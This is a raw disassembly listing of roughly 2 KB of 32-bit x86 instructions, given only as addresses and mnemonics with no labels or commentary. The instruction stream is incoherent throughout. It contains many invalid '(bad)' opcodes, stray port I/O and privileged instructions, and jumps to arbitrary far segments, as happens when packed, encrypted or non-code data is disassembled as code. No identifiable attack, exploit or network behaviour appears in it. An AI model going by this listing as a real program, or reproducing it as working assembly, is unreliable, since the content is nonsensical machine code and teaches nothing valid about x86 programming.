  4164db:	mov    al,ds:0xba4d1f24
  4164e0:	adc    al,0xe5
  4164e2:	cmp    eax,0x267dbb47
  4164e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e8:	mov    eax,DWORD PTR [edi]
  4164ea:	add    ebp,DWORD PTR ds:0x3ac54372
  4164f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f1:	sub    esi,DWORD PTR [eax-0x5f]
  4164f4:	jmp    0x41655c
  4164f6:	fcom   QWORD PTR [ecx-0x2e08cc83]
  4164fc:	je     0x416554
  4164fe:	xor    esp,0x5e
  416501:	mov    edx,ebx
  416503:	pusha  
  416504:	xor    eax,0x5e3f2a4f
  416509:	stc    
  41650a:	out    dx,al
  41650b:	ss leave 
  41650d:	frstor [eax+edx*1+0x72]
  416511:	jg     0x41656a
  416513:	test   DWORD PTR [ebx],ebx
  416515:	push   esi
  416516:	and    bl,BYTE PTR [edi-0x72]
  416519:	scas   al,BYTE PTR es:[edi]
  41651a:	ins    DWORD PTR es:[edi],dx
  41651b:	jmp    0xcd37a7ea
  416520:	mov    BYTE PTR [edx-0x32e5f1ce],cl
  416526:	adc    BYTE PTR [ecx+esi*1+0x27988b9c],ch
  41652d:	mov    ds:0xdeb84e97,eax
  416532:	push   eax
  416533:	jmp    0x4164de
  416535:	call   0xda74:0x92de7d60
  41653c:	out    dx,al
  41653d:	mov    dl,0x3c
  41653f:	mov    edi,0x7b91b315
  416544:	jle    0x41657e
  416546:	(bad)  
  416547:	mov    eax,0xd8892155
  41654c:	pop    ebp
  41654d:	and    ecx,DWORD PTR [ebp+0x554f3b5]
  416553:	test   al,0xf4
  416555:	scas   al,BYTE PTR es:[edi]
  416556:	ret    
  416557:	sub    ebp,DWORD PTR [ebp-0x5b]
  41655a:	dec    eax
  41655b:	or     BYTE PTR [ecx-0x2ef1aabd],cl
  416561:	xchg   DWORD PTR [ecx],edi
  416563:	inc    eax
  416564:	pop    es
  416565:	call   0xbcc1:0xe72cfeff
  41656c:	cwde   
  41656d:	call   FWORD PTR [edx]
  41656f:	repz xor DWORD PTR [edi],0x3a37a2c8
  416576:	mov    bl,BYTE PTR [ebp+0x7]
  416579:	scas   al,BYTE PTR es:[edi]
  41657a:	js     0x41656f
  41657c:	imul   ebx,DWORD PTR [eax+0x3f],0xc7900d1e
  416583:	lds    edi,FWORD PTR [ebx+0x7e]
  416586:	fbld   TBYTE PTR [esi+0xe8453b]
  41658c:	enter  0x3b01,0x1a
  416590:	js     0x41658d
  416592:	je     0x4165aa
  416594:	ret    0x8f88
  416597:	bound  edi,QWORD PTR [edx+ecx*2+0x511590ce]
  41659e:	dec    edi
  41659f:	je     0x4165f6
  4165a1:	and    BYTE PTR [edi-0xbd0008b],al
  4165a7:	scas   eax,DWORD PTR es:[edi]
  4165a8:	and    BYTE PTR [eax],0xdb
  4165ab:	pushf  
  4165ac:	sbb    esp,DWORD PTR [ecx-0x7]
  4165af:	jecxz  0x416619
  4165b1:	push   cs
  4165b2:	enter  0x378b,0xfc
  4165b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b7:	mov    bl,0xab
  4165b9:	repnz push ds
  4165bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165bc:	adc    al,0x79
  4165be:	jecxz  0x41662e
  4165c0:	sbb    al,0xb1
  4165c2:	je     0x4165b3
  4165c4:	js     0x4165e7
  4165c6:	aaa    
  4165c7:	xchg   DWORD PTR [edi-0x79cf2c26],eax
  4165cd:	mov    edx,0x26c67220
  4165d2:	aam    0xd4
  4165d4:	out    dx,eax
  4165d5:	(bad)  
  4165d6:	jle    0x416633
  4165d8:	iret   
  4165d9:	add    BYTE PTR gs:[edx-0x358cbfa4],bl
  4165e0:	div    DWORD PTR [ebx]
  4165e2:	inc    esp
  4165e3:	mov    edi,0x6f01b7dd
  4165e8:	ret    
  4165e9:	or     DWORD PTR [esi+0x25],ebx
  4165ec:	outs   dx,BYTE PTR ds:[esi]
  4165ed:	jmp    0x7fdd:0x8b19142a
  4165f4:	xchg   edx,eax
  4165f5:	jmp    0xb1973d06
  4165fa:	push   esp
  4165fb:	fiadd  WORD PTR [ebx]
  4165fd:	mov    esp,0xfb8bb43f
  416602:	add    BYTE PTR [ebx],bl
  416604:	gs xchg esp,eax
  416606:	loop   0x4165ae
  416608:	pop    ebp
  416609:	add    ch,BYTE PTR [edx+ecx*2+0x5f]
  41660d:	dec    edx
  41660e:	cs jnp 0x416623
  416611:	rcl    BYTE PTR [ebx-0x45],0x29
  416615:	push   edi
  416616:	pop    ss
  416617:	push   esp
  416618:	push   0xf
  41661a:	mov    dh,0xf5
  41661c:	pop    esi
  41661d:	or     BYTE PTR [edi+0x736a704b],dl
  416623:	mov    ecx,0x9bf7a275
  416628:	popf   
  416629:	sbb    BYTE PTR [eax-0x26],dl
  41662c:	xchg   edi,eax
  41662d:	pop    edi
  41662e:	sti    
  41662f:	jns    0x416623
  416631:	xor    esi,eax
  416633:	xchg   esi,eax
  416634:	jns    0x416638
  416636:	jae    0x416666
  416638:	sbb    eax,0x818eafb0
  41663d:	push   edx
  41663e:	fdivr  DWORD PTR [ebp-0x7d]
  416641:	int    0x88
  416643:	in     al,dx
  416644:	ds and edi,0xfffffff6
  416648:	ror    DWORD PTR [ebp-0x10],cl
  41664b:	xchg   edi,eax
  41664c:	xchg   ebx,eax
  41664d:	clc    
  41664e:	fsubr  DWORD PTR [edi-0x6]
  416651:	push   0xba328b4b
  416656:	sub    ebx,DWORD PTR [eax-0x13528884]
  41665c:	stos   BYTE PTR es:[edi],al
  41665d:	call   0x30e19a14
  416662:	ins    DWORD PTR es:[edi],dx
  416663:	adc    eax,0x2c4bd9ca
  416668:	int3   
  416669:	imul   ebx,DWORD PTR [eax],0xc59717eb
  41666f:	out    0x87,eax
  416671:	add    eax,0x31d11c1
  416676:	sub    edx,DWORD PTR [ebx+ebx*8+0x564a85a6]
  41667d:	std    
  41667e:	sbb    al,0x36
  416680:	adc    ah,BYTE PTR [edx]
  416682:	icebp  
  416683:	out    dx,eax
  416684:	stc    
  416685:	cld    
  416686:	cli    
  416687:	(bad)  
  416688:	push   ebp
  416689:	imul   ecx,DWORD PTR [ebp+0x50],0x61693e8a
  416690:	jne    0x4166be
  416692:	push   cs
  416693:	js     0x4166c6
  416695:	inc    esi
  416696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416697:	mov    ebx,0xd490927d
  41669c:	add    al,0xc6
  41669e:	mov    esp,0x4cb93553
  4166a3:	mov    al,ds:0xf713e56a
  4166a8:	ss push edi
  4166aa:	stos   DWORD PTR es:[edi],eax
  4166ab:	sbb    ch,BYTE PTR [ebx]
  4166ad:	test   bl,0xc8
  4166b0:	loopne 0x4166bf
  4166b2:	mov    cl,0x98
  4166b4:	sahf   
  4166b5:	dec    ebp
  4166b6:	scas   al,BYTE PTR es:[edi]
  4166b7:	ja     0x416670
  4166b9:	cmp    eax,0x3d699bff
  4166be:	inc    ebp
  4166bf:	arpl   WORD PTR [eax],si
  4166c1:	rol    DWORD PTR [esi+0x6c],0xf8
  4166c5:	xor    eax,0x75f8a481
  4166ca:	mov    eax,0xd9280c0b
  4166cf:	pusha  
  4166d0:	sti    
  4166d1:	scas   eax,DWORD PTR es:[edi]
  4166d2:	ins    DWORD PTR es:[edi],dx
  4166d3:	(bad)  
  4166d4:	xor    al,0xd8
  4166d6:	xchg   esp,eax
  4166d7:	ret    
  4166d8:	xchg   BYTE PTR [eax-0xa63b29d],ah
  4166de:	adc    bl,0xee
  4166e1:	mov    DWORD PTR [ebp+0x7b9e7f21],esp
  4166e7:	xchg   ebx,eax
  4166e8:	test   BYTE PTR [edx+0x20],cl
  4166eb:	das    
  4166ec:	sub    eax,0x9adc82b6
  4166f1:	popf   
  4166f2:	and    ebx,DWORD PTR [eax+0x2b]
  4166f5:	shl    DWORD PTR [edx-0x90970cb],cl
  4166fb:	mov    ch,0x75
  4166fd:	mov    cl,0x48
  4166ff:	test   BYTE PTR [bx-0x10d],ah
  416704:	popf   
  416705:	out    0xdb,al
  416707:	retf   
  416708:	cwde   
  416709:	mov    dh,0x87
  41670b:	xor    eax,0x236a32bf
  416710:	mov    bh,0xc4
  416712:	cld    
  416713:	les    ecx,FWORD PTR [esi]
  416715:	dec    ebx
  416716:	(bad)  
  416717:	retf   0xd288
  41671a:	add    ebp,ebp
  41671c:	push   ebx
  41671d:	jno    0x41674c
  41671f:	out    0x37,al
  416721:	add    eax,ecx
  416723:	imul   edx,esp,0xffffffbe
  416726:	les    esi,FWORD PTR [edx-0x49eafe58]
  41672c:	sub    DWORD PTR [ebp+0x492fdd1],ebp
  416732:	sbb    BYTE PTR [edx+0x33],bl
  416735:	xlat   BYTE PTR ds:[ebx]
  416736:	mov    bh,0xec
  416738:	push   0xfb748014
  41673d:	mov    eax,ds:0x2ddfa3e1
  416742:	loop   0x416772
  416744:	or     al,0x3
  416746:	mov    bl,0x1b
  416748:	outs   dx,BYTE PTR ds:[esi]
  416749:	out    0x97,eax
  41674b:	aas    
  41674c:	adc    bh,BYTE PTR [eax]
  41674e:	out    0x57,eax
  416750:	add    ebp,esi
  416752:	cmp    al,0xc9
  416754:	push   es
  416755:	sbb    BYTE PTR [ecx-0x54a854f7],dh
  41675b:	loope  0x4166e0
  41675d:	sub    eax,0x9e39564c
  416762:	jle    0x416708
  416764:	mov    fs,WORD PTR [edi]
  416766:	mov    ds:0x2785dc2e,al
  41676b:	jno    0x416750
  41676d:	adc    al,0x71
  41676f:	js     0x416773
  416771:	sahf   
  416772:	inc    ebx
  416773:	sub    BYTE PTR [ebp+ebp*4-0x4d],al
  416777:	sahf   
  416778:	cmp    al,0x53
  41677a:	scas   eax,DWORD PTR es:[edi]
  41677b:	les    edi,FWORD PTR [edx-0x34]
  41677e:	mov    al,ds:0xb59dc3a8
  416783:	jns    0x4167db
  416785:	adc    DWORD PTR [ebp-0x64b988e8],ecx
  41678b:	int3   
  41678c:	and    ecx,DWORD PTR [esi-0x5d]
  41678f:	fdivr  QWORD PTR [ecx]
  416791:	adc    eax,0x9f36e5f0
  416796:	xor    DWORD PTR [esi+0x4ade25c],edx
  41679c:	xor    BYTE PTR [esi],bh
  41679e:	test   eax,0x388fc6fc
  4167a3:	jnp    0x416731
  4167a5:	and    bh,0x15
  4167a8:	or     ecx,DWORD PTR [ebp+0x59]
  4167ab:	scas   eax,DWORD PTR es:[edi]
  4167ac:	retf   
  4167ad:	retf   0x34af
  4167b0:	mov    ch,0xb4
  4167b2:	inc    edx
  4167b3:	push   0x2599baa
  4167b8:	out    dx,eax
  4167b9:	jge    0x416776
  4167bb:	pop    ss
  4167bc:	pop    ss
  4167bd:	dec    BYTE PTR [esi+0x6c]
  4167c0:	(bad)  
  4167c1:	retf   
  4167c2:	xchg   edx,eax
  4167c3:	mov    bh,0xd9
  4167c5:	fmul   st,st(0)
  4167c7:	in     al,dx
  4167c8:	test   al,0x1
  4167ca:	or     edx,ecx
  4167cc:	cmp    dh,BYTE PTR [edi-0x6a3a781b]
  4167d2:	mov    ch,0x7c
  4167d4:	aad    0xa5
  4167d6:	sbb    ebp,ebx
  4167d8:	push   ds
  4167d9:	mov    dh,0x35
  4167db:	inc    esi
  4167dc:	(bad)  
  4167dd:	clc    
  4167de:	pop    eax
  4167df:	sbb    edi,ebp
  4167e1:	dec    esi
  4167e2:	jne    0x4167c1
  4167e4:	cwde   
  4167e5:	clc    
  4167e6:	and    edx,DWORD PTR [eax]
  4167e8:	iret   
  4167e9:	push   edx
  4167ea:	pop    ebp
  4167eb:	lds    edi,FWORD PTR [ecx+0x23]
  4167ee:	jns    0x416832
  4167f0:	loope  0x416841
  4167f2:	std    
  4167f3:	js     0x41681a
  4167f5:	lds    ebp,FWORD PTR [edi+0x3415fb43]
  4167fb:	push   esi
  4167fc:	ins    BYTE PTR es:[edi],dx
  4167fd:	in     al,dx
  4167fe:	ret    0xd416
  416801:	mov    ebx,0xac5d640
  416806:	and    edi,DWORD PTR [ecx+0x2280e8f8]
  41680c:	sub    DWORD PTR [esi-0x22f47b06],esi
  416812:	fs mov dh,0x7f
  416815:	mov    cl,0x48
  416817:	rcl    BYTE PTR [eax-0x12dcc417],1
  41681d:	das    
  41681e:	sub    al,0x83
  416820:	test   eax,0xf1274c6b
  416825:	add    al,0x83
  416827:	rcl    BYTE PTR [edx+0x74da4c84],cl
  41682d:	ss cmp ah,al
  416830:	mov    edi,0x55084c0e
  416835:	cmp    eax,0xd26fe0e5
  41683a:	mov    ebx,0x441eca96
  41683f:	bound  edx,QWORD PTR [edx+0x4f]
  416842:	ret    0x36fa
  416845:	sbb    al,0x5d
  416847:	and    bl,BYTE PTR [eax]
  416849:	mov    dl,0xd1
  41684b:	xchg   edx,esp
  41684d:	push   0x3856343e
  416852:	mov    ds:0xa0eb0b33,al
  416857:	mov    ebp,DWORD PTR [ebp-0x185caa1f]
  41685d:	in     eax,0x44
  41685f:	jns    0x4168b6
  416861:	std    
  416862:	fwait
  416863:	retf   0x4532
  416866:	in     al,0xd5
  416868:	es (bad) 
  41686a:	call   0xd10d1999
  41686f:	fisttp WORD PTR [edi-0x2eb62a9d]
  416875:	ret    0x4f51
  416878:	cmp    BYTE PTR [ecx+ebp*8-0x30],cl
  41687c:	ret    
  41687d:	imul   esi,DWORD PTR [edi+0x5bf9c798],0x7041daa
  416887:	or     eax,0xa46fae5b
  41688c:	aad    0x37
  41688e:	mov    ds,WORD PTR [ecx]
  416890:	jmp    0x75279609
  416895:	in     al,dx
  416896:	inc    ecx
  416897:	xchg   ebx,eax
  416898:	push   esp
  416899:	adc    BYTE PTR [ecx],0x60
  41689c:	shr    DWORD PTR [ebx-0x44256cda],cl
  4168a2:	or     al,0xc1
  4168a4:	sti    
  4168a5:	ds sub al,0xbf
  4168a8:	int    0x8
  4168aa:	bound  ebx,QWORD PTR [esi+0x7caad4f]
  4168b0:	mov    ss,WORD PTR [ebx-0x5d]
  4168b3:	mov    ebx,0x2afd70d4
  4168b8:	les    ebp,FWORD PTR [eax-0x4bcaa81d]
  4168be:	fnstcw WORD PTR [ecx-0x7019f488]
  4168c4:	int    0x6a
  4168c6:	int3   
  4168c7:	std    
  4168c8:	pop    esi
  4168c9:	xchg   edx,eax
  4168ca:	inc    ebx
  4168cb:	lahf   
  4168cc:	fs ins DWORD PTR es:[edi],dx
  4168ce:	(bad)
  4168d2:	or     BYTE PTR [ebx-0x5],cl
  4168d5:	push   ecx
  4168d6:	inc    esp
  4168d7:	mov    bh,0x97
  4168d9:	adc    eax,0x615929fc
  4168de:	mov    edi,0x44e08a0c
  4168e3:	and    eax,DWORD PTR [eax-0x2102251f]
  4168e9:	ret    0x11d5
  4168ec:	inc    ebx
  4168ed:	fnstsw WORD PTR [ebx]
  4168ef:	pusha  
  4168f0:	pop    esi
  4168f1:	std    
  4168f2:	mov    ds,WORD PTR [ebp+esi*4+0x58149098]
  4168f9:	jl     0x416880
  4168fb:	pop    es
  4168fc:	adc    cl,BYTE PTR [ebx]
  4168fe:	in     eax,dx
  4168ff:	rcl    DWORD PTR [eax],0x66
  416902:	push   0x5150fcef
  416907:	retf   0x4ba2
  41690a:	aas    
  41690b:	mov    dl,0xc3
  41690d:	push   ds
  41690e:	test   BYTE PTR [esi+0x537d0158],dl
  416914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416915:	xchg   edx,eax
  416916:	xor    eax,0xc7ccf41
  41691b:	add    esi,DWORD PTR [edi+0x1708825a]
  416921:	cmp    ch,BYTE PTR [esi]
  416923:	jb     0x416912
  416925:	test   al,0x21
  416927:	imul   esi,eax,0x4a
  41692a:	ficom  WORD PTR [ebx+edi*1+0x50320c8a]
  416931:	sub    DWORD PTR [esi],ecx
  416933:	sahf   
  416934:	iret   
  416935:	mov    bh,0x15
  416937:	arpl   WORD PTR [edi+0x15],bx
  41693a:	dec    edx
  41693b:	outs   dx,BYTE PTR ds:[esi]
  41693c:	mov    bh,0x12
  41693e:	or     bl,BYTE PTR [esi-0x5aa22368]
  416944:	dec    edi
  416945:	je     0x4169a6
  416947:	mov    eax,0x441de31e
  41694c:	add    BYTE PTR [ecx+0x6],ah
  41694f:	jns    0x416939
  416951:	add    eax,0x45b389b2
  416956:	cmp    ah,dh
  416958:	push   ecx
  416959:	mov    ebp,0x18b702be
  41695e:	mov    es,WORD PTR [edi-0x701c48bd]
  416964:	mov    cl,0x53
  416967:	add    BYTE PTR [edx-0x7e77064f],ch
  41696d:	leave  
  41696e:	hlt    
  41696f:	in     al,0x93
  416971:	xchg   esi,eax
  416972:	add    eax,0x53a58ffa
  416977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416978:	rcr    DWORD PTR [edx+0x337c03f8],0xaf
  41697f:	mov    ebp,0x7ddbb8a4
  416984:	add    eax,0x1f90564d
  416989:	je     0x4169ed
  41698b:	out    dx,al
  41698c:	(bad)  
  41698d:	loop   0x41697f
  41698f:	cmp    ch,BYTE PTR [esi]
  416991:	clc    
  416992:	stos   BYTE PTR es:[edi],al
  416993:	inc    eax
  416994:	(bad)  
  416995:	loope  0x416923
  416997:	jmp    0x7cf7:0x940e894c
  41699e:	loop   0x41695d
  4169a0:	push   ss
  4169a1:	sbb    dl,BYTE PTR [esi+0x39]
  4169a4:	sub    eax,DWORD PTR [edi]
  4169a6:	add    al,BYTE PTR ds:0x4bc5c9a5
  4169ac:	and    BYTE PTR ss:[ebp+0x27],0x9b
  4169b1:	pop    esi
  4169b2:	jo     0x4169a2
  4169b4:	rol    BYTE PTR [ecx-0x798e722a],cl
  4169ba:	nop
  4169bb:	adc    al,0x6d
  4169bd:	(bad)  
  4169be:	leave  
  4169bf:	inc    edx
  4169c0:	fild   QWORD PTR [edi]
  4169c2:	cld    
  4169c3:	hlt    
  4169c4:	mov    bh,0x29
  4169c6:	pop    ebx
  4169c7:	mov    ds:0x9603d0f,al
  4169cc:	pushf  
  4169cd:	(bad)  
  4169ce:	xchg   ebp,edi
  4169d0:	or     eax,0x97c903d6
  4169d5:	push   ecx
  4169d6:	mov    esi,DWORD PTR [ecx-0x43]
  4169d9:	dec    ebp
  4169da:	dec    eax
  4169db:	mov    eax,ds:0x8ab73828
  4169e0:	icebp  
  4169e1:	push   ebp
  4169e2:	lahf   
  4169e3:	or     al,BYTE PTR [ebx+0x4c]
  4169e6:	cmp    dl,BYTE PTR [edi+0x57738bcf]
  4169ec:	scas   al,BYTE PTR es:[edi]
  4169ed:	push   ebp
  4169ee:	js     0x416a56
  4169f0:	add    bh,BYTE PTR ds:[ebp-0x7148a8d0]
  4169f7:	mov    dl,0x7
  4169f9:	cmp    DWORD PTR [esi+0x74ec432b],esi
  4169ff:	push   ebx
  416a00:	std    
  416a01:	jecxz  0x416a5f
  416a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a04:	std    
  416a05:	dec    edi
  416a06:	inc    edx
  416a07:	inc    edx
  416a08:	or     DWORD PTR [eax],ecx
  416a0a:	add    al,BYTE PTR [ebx+0x5b6eabd0]
  416a10:	add    BYTE PTR [esp+edx*1],0xda
  416a14:	into   
  416a15:	fwait
  416a16:	sbb    dl,BYTE PTR [esp+ebx*8]
  416a19:	enter  0xf5bc,0xdf
  416a1d:	inc    edx
  416a1e:	and    al,0xf9
  416a20:	lds    eax,FWORD PTR [ecx]
  416a22:	mov    eax,0xfb5b78e7
  416a27:	mov    bh,0xa5
  416a29:	loop   0x416a48
  416a2b:	pop    ebx
  416a2c:	jle    0x416a95
  416a2e:	jne    0x416aa7
  416a30:	dec    esp
  416a31:	push   esp
  416a32:	sbb    eax,0x30292d36
  416a37:	in     al,0x5f
  416a39:	dec    ebx
  416a3a:	jle    0x416aa4
  416a3c:	cmp    bh,BYTE PTR [esi-0x5b]
  416a3f:	fst    QWORD PTR [ecx-0x39]
  416a42:	push   eax
  416a43:	dec    ebp
  416a44:	xor    ah,BYTE PTR [edx]
  416a46:	clc    
  416a47:	adc    BYTE PTR [edx+0x20b5c2cc],0x45
  416a4e:	jmp    0x416a40
  416a50:	clc    
  416a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a52:	or     al,0x40
  416a54:	pop    ds
  416a55:	push   0x28cf2b28
  416a5a:	pop    ecx
  416a5b:	sbb    DWORD PTR [esi-0x56],edi
  416a5e:	jae    0x416a7f
  416a60:	add    DWORD PTR [eax+0x17],ecx
  416a63:	shl    BYTE PTR [edi-0x5d77bce4],1
  416a69:	xchg   esp,eax
  416a6a:	cmp    cl,dh
  416a6c:	arpl   WORD PTR [edi-0x9],ax
  416a6f:	mov    ebx,0xb1e15154
  416a74:	mov    esi,DWORD PTR fs:[ebx*4+0x571c444d]
  416a7c:	stos   DWORD PTR es:[edi],eax
  416a7d:	mov    esp,0x6342f658
  416a82:	mov    ds:0x5dcb0da,eax
  416a87:	push   cs
  416a88:	imul   ecx,DWORD PTR [edx-0x2f2e010d],0x740c5e76
  416a92:	ds push eax
  416a94:	mov    dh,0x66
  416a96:	cdq    
  416a97:	sub    eax,0x789505a3
  416a9c:	pop    edx
  416a9d:	pop    es
  416a9e:	jmp    0x6a98d550
  416aa3:	and    DWORD PTR [ecx+0x5e5f708e],ebx
  416aa9:	(bad)  
  416aaa:	pop    ss
  416aab:	shr    DWORD PTR [esi+0x3e],0xec
  416aaf:	retf   0x97b0
  416ab2:	inc    ecx
  416ab3:	mov    eax,ds:0xf30f0b62
  416ab8:	or     ecx,esi
  416aba:	xor    bh,al
  416abc:	mov    bl,0x2b
  416abe:	or     BYTE PTR [esi],dl
  416ac0:	mov    DWORD PTR [ebx-0x4eb737b2],esi
  416ac6:	shl    DWORD PTR [esi],1
  416ac8:	inc    esp
  416ac9:	sub    edx,ebx
  416acb:	or     ebp,DWORD PTR [ecx]
  416acd:	imul   eax,DWORD PTR [edx],0x80f200c3
  416ad3:	mov    al,0x3d
  416ad5:	cdq    
  416ad6:	clc    
  416ad7:	mov    ch,0xd1
  416ad9:	(bad)  
  416ada:	xor    bh,cl
  416adc:	push   ecx
  416add:	sbb    edx,DWORD PTR [eax+0x4dadda1e]
  416ae3:	cli    
  416ae4:	jecxz  0x416b4c
  416ae6:	mul    eax
  416ae8:	mov    DWORD PTR [esp+ebp*8-0x1b],eax
  416aec:	cmp    bh,al
  416aee:	in     al,dx
  416aef:	add    DWORD PTR [ebp-0x56],0xb24ae82c
  416af6:	in     al,dx
  416af7:	push   ebx
  416af8:	outs   dx,BYTE PTR ds:[esi]
  416af9:	jp     0x416b2c
  416afb:	jle    0x416a9f
  416afd:	xchg   esp,eax
  416afe:	push   esi
  416aff:	repz push esp
  416b01:	mov    edx,0xef84480c
  416b06:	test   ch,0xa7
  416b09:	inc    esi
  416b0a:	cmp    DWORD PTR [ebp-0x5983132d],ecx
  416b10:	leave  
  416b11:	out    dx,eax
  416b12:	xor    ecx,DWORD PTR [edx+0x77]
  416b15:	jbe    0x416af5
  416b17:	xor    al,0x5f
  416b19:	cmp    BYTE PTR [eax-0x4],ah
  416b1c:	sbb    al,0xcc
  416b1e:	int3   
  416b1f:	ret    0x31dc
  416b22:	shr    DWORD PTR [edx],cl
  416b24:	lahf   
  416b25:	aad    0x56
  416b27:	pusha  
  416b28:	push   0x9135e382
  416b2d:	daa    
  416b2e:	push   ebp
  416b2f:	dec    ecx
  416b30:	cld    
  416b31:	dec    eax
  416b32:	adc    edx,DWORD PTR [ecx-0x15]
  416b35:	push   edx
  416b36:	and    ecx,edx
  416b38:	xchg   edx,eax
  416b39:	add    DWORD PTR fs:[edx+0x6a],esi
  416b3d:	mov    ?,esp
  416b3f:	leave  
  416b40:	(bad)  
  416b41:	mov    es,WORD PTR [edx-0x3d]
  416b44:	out    0xa2,eax
  416b46:	sub    bl,BYTE PTR [ebx+0x27]
  416b49:	ins    DWORD PTR es:[edi],dx
  416b4a:	mov    ebp,0x9aff251
  416b4f:	pop    edx
  416b50:	int    0xc3
  416b52:	jne    0x416adb
  416b54:	imul   edi,esp,0x957942df
  416b5a:	sub    al,0xe1
  416b5c:	lods   eax,DWORD PTR ds:[esi]
  416b5d:	push   esp
  416b5f:	inc    ebx
  416b60:	mov    eax,0xb301d9a3
  416b65:	add    dh,bh
  416b67:	mov    ds:0x1aa88378,al
  416b6c:	jl     0x416afa
  416b6e:	push   0x85d74006
  416b73:	push   0x2a
  416b75:	gs ret 
  416b77:	out    dx,eax
  416b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b79:	xor    eax,0x3cdc9335
  416b7e:	les    ecx,FWORD PTR [eax]
  416b80:	das    
  416b81:	iret   
  416b82:	cmp    DWORD PTR [edi],0x1e
  416b85:	mov    WORD PTR [esi+0x72869165],cs
  416b8b:	sub    eax,0x8a7fc258
  416b90:	fidiv  DWORD PTR [edi+0x37fe26fa]
  416b96:	out    0x50,eax
  416b98:	(bad)  
  416b99:	jmp    DWORD PTR [edi]
  416b9b:	cmp    DWORD PTR [edx-0x7dc25c66],eax
  416ba1:	sahf   
  416ba2:	bound  edx,QWORD PTR [ebx-0x25]
  416ba5:	sub    edi,ecx
  416ba7:	scas   eax,DWORD PTR es:[edi]
  416ba8:	iret   
  416ba9:	in     al,0x81
  416bab:	repnz stos BYTE PTR es:[edi],al
  416bad:	or     dh,BYTE PTR [eax-0x4997d870]
  416bb3:	or     al,0xc6
  416bb5:	das    
  416bb6:	test   al,0x82
  416bb8:	test   DWORD PTR [edi],esi
  416bba:	push   esp
  416bbb:	jmp    0xcf3b6420
  416bc0:	aad    0x36
  416bc2:	enter  0x4077,0x2a
  416bc6:	ret    
  416bc7:	sbb    eax,DWORD PTR [ebx+0x14]
  416bca:	aad    0x7
  416bcc:	or     al,0x74
  416bce:	push   esp
  416bcf:	scas   eax,DWORD PTR es:[edi]
  416bd0:	cdq    
  416bd1:	lods   eax,DWORD PTR ds:[esi]
  416bd2:	cmp    DWORD PTR [edi-0x46],edx
  416bd5:	rol    BYTE PTR ds:0x4a7d56fc,0xb8
  416bdc:	mov    eax,ds:0x2e504b10
  416be1:	sbb    eax,0x6719520
  416be6:	jnp    0x416c27
  416be8:	lock jb 0x416beb
  416beb:	in     eax,0xe8
  416bed:	push   ebx
  416bee:	out    0xd6,al
  416bf0:	jmp    0x416c19
  416bf2:	das    
  416bf3:	clc    
  416bf4:	inc    edi
  416bf5:	mov    dl,0x89
  416bf7:	test   DWORD PTR [ebx-0x15],0x23d57e2c
  416bfe:	adc    eax,0x25e5df91
  416c03:	fwait
  416c04:	sub    BYTE PTR [esi+0x58a52508],ch
  416c0a:	jo     0x416bd4
  416c0c:	shr    esp,0xa3
  416c0f:	sti    
  416c10:	popf   
  416c11:	xchg   ebp,eax
  416c12:	ret    0xbd79
  416c15:	mov    ch,bl
  416c17:	sbb    eax,0x73489f5e
  416c1c:	(bad)  [edi]
  416c1e:	jnp    0x416bad
  416c20:	jge    0x416bc5
  416c22:	daa    
  416c23:	mov    bl,0xbb
  416c25:	dec    ebp
  416c26:	dec    eax
  416c27:	pop    esp
  416c28:	aaa    
  416c29:	mov    esp,0x5c3dcc9c
  416c2e:	xor    al,0x25
  416c30:	jecxz  0x416bd8
  416c32:	and    eax,0x14f791bb
  416c37:	pusha  
  416c38:	mov    ebp,0x861dbe45
  416c3d:	outs   dx,BYTE PTR ds:[esi]
  416c3e:	mov    edi,0x56387bfd
  416c43:	test   eax,0x55bb909f
  416c48:	loope  0x416bfe
  416c4a:	push   ebp
  416c4b:	es scas al,BYTE PTR es:[edi]
  416c4d:	outs   dx,DWORD PTR ds:[esi]
  416c4e:	or     esi,DWORD PTR [edx+esi*2-0x43]
  416c52:	js     0x416c16
  416c54:	sbb    BYTE PTR [edx],ch
  416c56:	ja     0x416c6b
  416c58:	mov    cl,0xc7
  416c5a:	sbb    ah,dl
  416c5c:	adc    ah,cl
  416c5e:	loope  0x416c87
  416c60:	imul   ebx,esi,0x268c09ca
  416c66:	add    eax,0x7b3f814f
  416c6b:	out    dx,eax
  416c6c:	adc    esp,DWORD PTR [eax+eiz*4]
  416c6f:	sub    esi,DWORD PTR [eax]
  416c71:	call   DWORD PTR [edi*8-0x7d499e66]
  416c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c79:	mov    ah,BYTE PTR [edi-0x3b4b16ed]
  416c7f:	xchg   ebx,eax
  416c80:	inc    ebp
  416c81:	and    al,0x82
  416c83:	fdiv   QWORD PTR [eax]
  416c85:	inc    esi
  416c86:	or     BYTE PTR [ecx+ebp*8+0x7],dl
  416c8a:	pop    ss
  416c8b:	inc    edi
  416c8c:	enter  0xf8df,0xd7
  416c90:	(bad)  
  416c91:	arpl   WORD PTR [eax],bp
  416c93:	test   al,0xd5
  416c95:	(bad)  
  416c96:	imul   edx,DWORD PTR [esp+eiz*2],0xfffffff2
  416c9a:	stc    
  416c9b:	or     ah,dh
  416c9d:	dec    eax
  416c9e:	pushf  
  416c9f:	jl     0x416c9c
  416ca1:	jecxz  0x416c3b
  416ca3:	dec    ebx
  416ca4:	fisttp QWORD PTR ds:0x34821735
  416caa:	sbb    eax,0x41e34280
  416caf:	jae    0x416c49
  416cb1:	gs dec eax
  416cb3:	jg     0x416c75
  416cb5:	or     eax,0x57c869c1
  416cba:	pop    edi
  416cbb:	fs cs gs push ecx
  416cbf:	or     BYTE PTR [ecx+ebx*4+0x12],0x1
  416cc4:	shr    BYTE PTR [edx],0x8e
  416cc7:	jle    0x416d3d
  416cc9:	or     al,0x12
  416ccb:	mov    DWORD PTR [edi-0x5a],0x8bf44809
  416cd2:	pop    ebp
  416cd3:	clc    
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
